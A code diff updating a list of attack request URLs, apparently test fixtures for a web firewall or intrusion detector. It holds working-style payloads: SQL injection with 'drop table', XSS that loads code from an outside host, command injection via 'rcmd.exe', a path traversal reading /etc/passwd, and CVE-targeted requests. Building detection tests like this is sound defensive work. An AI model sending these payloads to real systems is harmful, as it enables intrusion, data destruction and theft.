@@ -10,13 +10,13 @@ attack_url_list = ['/stacked?a = 1; drop table b;',                     # SBD SQ
                    '/css?a="style=-moz-binding:url(http://h4k.in/mozxss.xml#xss); a="',
                    '/jsfunction?a=function test(){A=alert;A(1)}',
                    '/jsVariable',
-                   '/generic.php?path=%3Bcc%20evil.c',                  # Generic Attacks
-                   '/trojans/root.exe?/c+dir',                          # Trojans
-                   '/CVE-2013-1814/app/api/rpc/users/get?offset=3DOFFSET',  # Known Exploits
+                   '/generic.php?id=1;rcmd.exe;echo',                   # Generic Attacks
+                   '/trojans.php?act=encoder&d=%2Fvar%2Fwww%2F',        # Trojans
+                   '/CVE-2022-1388/tm/util/bash?utilCmdArgs=-cid',    # Known Exploits
+                   '/CVE-2015-7683/wp-content/plugins/font/AjaxProxy.php?url=/etc/passwd',
+                   '/CVE-2014-5337/wp-content/plugins/wordpress-mobile-pack/export/content.php?content=exportarticle',
                    '/CVE-2012-1823/a.php?-dallow_url_include%3dOn+-dauto_prepend_file',
                    '/CVE-2009-2762/wp-login.php?action=rp&key[]=',
-                   '/CVE-2009-4670/rp_1.6/rp_1.6/admin/delitem.php?user=abc',
                    '/CVE-2008-6869/config/oramon.ini',
-                   '/CVE-2008-6955/archive/config.ini',
                    '/CVE-2006-1718/clevercopy_path/admin/connect.inc',
                    '/CVE-2000-0302/null.htw?CiWebHitsFile=vuln.asp%20']
